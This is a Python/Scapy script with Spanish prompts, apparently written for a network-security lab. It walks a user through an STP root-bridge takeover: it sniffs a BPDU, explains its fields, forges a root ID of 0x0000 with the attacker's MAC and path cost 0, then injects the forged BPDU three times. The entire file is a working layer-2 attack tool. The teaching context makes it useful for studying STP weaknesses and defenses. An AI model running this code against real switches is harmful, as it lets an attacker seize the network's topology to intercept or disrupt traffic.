#!/usr/bin/env python3
from scapy.all import *
import sys
import time
import re

SEPARATOR = "\n" + "=" * 70 + "\n"

def ascii_banner(text):
    print("\n" + "=" * (len(text) + 4))
    print(f"| {text} |")
    print("=" * (len(text) + 4))

def intro():
    ascii_banner("INICIO DEL ATAQUE SPANNING TREE")
    print()
    print("Paso 1: Abre Wireshark y selecciona la interfaz 'swX-p5-kaliX'")
    print("        En esta interfaz se observan los paquetes Spanning Tree legítimos originados desde Kali.")
    print("        Es importante hacer un pequeño análisis y entender estos paquetes antes de suplantar el root bridge.")
    print()
    input("Presiona ENTER cuando estés listo y Wireshark esté capturando...")

def explain_mac_addresses(pkt):
    print(SEPARATOR)
    print("Análisis del paquete STP (Spanning Tree Protocol) capturado")
    print()
    print("Objetivo: entender la estructura de la BPDU y preparar su modificación.")
    print()
    print("Se deben identificar dos direcciones MAC importantes:")
    print("  1. La MAC de Kali en la interfaz 'swX-p5-kali'")
    print("  2. La MAC del switch legítimo conectado")
    print()
    print("En Kali: ejecuta 'ip link show' y localiza 'swF-p5-kali'")
    print("En el switch: usa 'show system' para ver su MAC")
    print()
    print("Análisis del paquete capturado:")
    print(f"  SOURCE      -> {pkt.src} (MAC desde la cual se envió la BPDU - Kali)")
    print(f"  DESTINATION -> {pkt.dst} (Multicast STP: 01:80:c2:00:00:00)")
    print("  Las BPDUs se envían a esta dirección multicast para que todos los switches las reciban.")

    stp = pkt.getlayer(STP)
    print(f"  ROOT BRIDGE -> {stp.rootmac}")
    print("  Esta es la MAC que declara el root bridge actual.")
    print("  Se modificará para que Kali aparezca como root bridge.")
    print("  El root bridge controla la topología de red.")

    print(SEPARATOR)
    print("Modificación de BPDU: prioridad y dirección MAC del root bridge")
    print("Estructura del campo Bridge ID (Root ID y Bridge ID):")
    print("  - 2 bytes: Prioridad (manual + VLAN ID)")
    print("  - 6 bytes: MAC address del bridge")
    print()
    print("PRIORIDAD (16 bits) = 4 bits prioridad manual + 12 bits VLAN ID")
    print("  Ejemplo: 0x2000 + VLAN 1 = 0x2001")
    print("  Cuanto más bajo el valor, mayor prioridad tiene el bridge.")
    print("  En el ataque se usará 0x0000 como prioridad y una MAC convincente.")
    print(SEPARATOR)
    ascii_banner("RESUMEN PAQUETE BPDU CAPTURADO")

def prompt_or_suggest(field_name, current_val, suggested_val, bits_info, desc, reason):
    print(SEPARATOR)
    print(f"Campo: {field_name}")
    print(f"Bits: {bits_info}")
    print(f"Descripción: {desc}")
    print(f"Valor actual: 0x{current_val:04x}")
    print(f"Sugerido:     0x{suggested_val:04x}  <- {reason}")
    choice = input("\n¿Quieres usar este valor sugerido? [S/n]: ").strip().lower()
    if choice == 'n':
        while True:
            user_input = input("Introduce el nuevo valor en hexadecimal (ej: 2000): ").strip()
            try:
                return int(user_input, 16)
            except ValueError:
                print("Valor no válido. Intenta de nuevo.")
    return suggested_val

def aplicar_modificaciones_base(pkt_base, pkt_modificado):
    if not (pkt_base.haslayer(STP) and pkt_modificado.haslayer(STP)):
        return pkt_base

    stp_base = pkt_base.getlayer(STP)
    stp_mod = pkt_modificado.getlayer(STP)

    stp_base.rootid = stp_mod.rootid
    stp_base.rootmac = stp_mod.rootmac
    stp_base.pathcost = stp_mod.pathcost
    stp_base.bridgeid = stp_mod.bridgeid
    stp_base.bridgemac = stp_mod.bridgemac

    return pkt_base

def is_valid_mac(mac):
    return re.fullmatch(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", mac) is not None

def prompt_hex_input(prompt_text, default_val):
    while True:
        user_input = input(prompt_text).strip()
        if user_input == '':
            return default_val
        try:
            val = int(user_input, 16)
            if 0x0000 <= val <= 0xFFFF:
                return val
            else:
                print("Valor fuera de rango válido (0x0000 a 0xFFFF).")
        except ValueError:
            print("Entrada no válida. Usa un número hexadecimal.")

def modify_bpdu(pkt):
    if pkt.haslayer(Dot3) and pkt.haslayer(LLC) and pkt.haslayer(STP):
        stp = pkt.getlayer(STP)

        ascii_banner("PAQUETE BPDU CAPTURADO")
        explain_mac_addresses(pkt)
        stp.show()

        print(SEPARATOR)
        input("Pulsa ENTER para modificar los campos clave del ataque STP...")

        stp.rootid = prompt_or_suggest(
            "ID del Root Bridge",
            stp.rootid,
            0x0000,
            "16 bits (4 prioridad + 12 VLAN)",
            "Usado para determinar la prioridad del bridge.",
            "Prioridad máxima para ser Root"
        )

        suggested_mac = pkt.src
        print(SEPARATOR)
        print("Campo: MAC del Root Bridge")
        print("En un ataque se puede usar la MAC del atacante o una aleatoria.")
        print(f"Valor actual: {stp.rootmac}")
        print(f"Sugerido:     {suggested_mac} (MAC del atacante capturada)")

        choice = input("\n¿Quieres usar esta MAC como Root Bridge? [S/n]: ").strip().lower()
        if choice == 'n':
            while True:
                new_mac = input("Introduce la MAC que quieres usar (ej. aa:bb:cc:dd:ee:ff): ").strip()
                if is_valid_mac(new_mac):
                    stp.rootmac = new_mac
                    break
                else:
                    print("Formato de MAC inválido.")
        else:
            stp.rootmac = suggested_mac

        stp.pathcost = prompt_or_suggest(
            "Path Cost",
            stp.pathcost,
            0x0000,
            "16 bits",
            "Costo acumulado al Root Bridge.",
            "0 indica conexión directa y prioridad máxima"
        )

        stp.bridgeid = 0x0000
        stp.bridgemac = suggested_mac

        ascii_banner("BPDU FINAL MODIFICADO")
        stp.show()
        return pkt
    else:
        print("El paquete no es un BPDU válido.")
        return None

def main():
    intro()

    if len(sys.argv) != 2:
        print(f"\nUso: {sys.argv[0]} <interfaz>")
        sys.exit(1)

    iface = sys.argv[1]
    print(f"\nCapturando paquete STP en interfaz {iface}...")

    pkts = sniff(filter="ether dst 01:80:c2:00:00:00", iface=iface, count=1)
    pkt = pkts[0]

    modified_pkt = modify_bpdu(pkt.copy())

    if modified_pkt:
        input("\nPulsa ENTER para enviar el BPDU modificado...")

        for _ in range(3):
            pkt_fresco = sniff(filter="ether dst 01:80:c2:00:00:00", iface=iface, count=1)[0]
            final_pkt = aplicar_modificaciones_base(pkt_fresco.copy(), modified_pkt)
            sendp(final_pkt, iface=iface, verbose=True)
            time.sleep(1)

        ascii_banner("ATAQUE STP LANZADO")
        print("Revisa en Wireshark los cambios de topología.")
        print("Puedes ver si el valor de Designated Root ha cambiado en el switch.")
        print("Usa el comando 'show stp s0' para comprobarlo.")

        print("\nNota: si se detiene el envío de BPDUs maliciosas, el switch reelegirá otro Root.")
        print("STP está diseñado para recuperarse automáticamente si no hay actividad del root anterior.")

        print("\nImportante: repetir el ataque con una prioridad más alta no tendrá efecto.")
        print("En STP, las prioridades más bajas tienen mayor peso.")
    else:
        print("No se envió ningún paquete.")

if __name__ == "__main__":
    main()
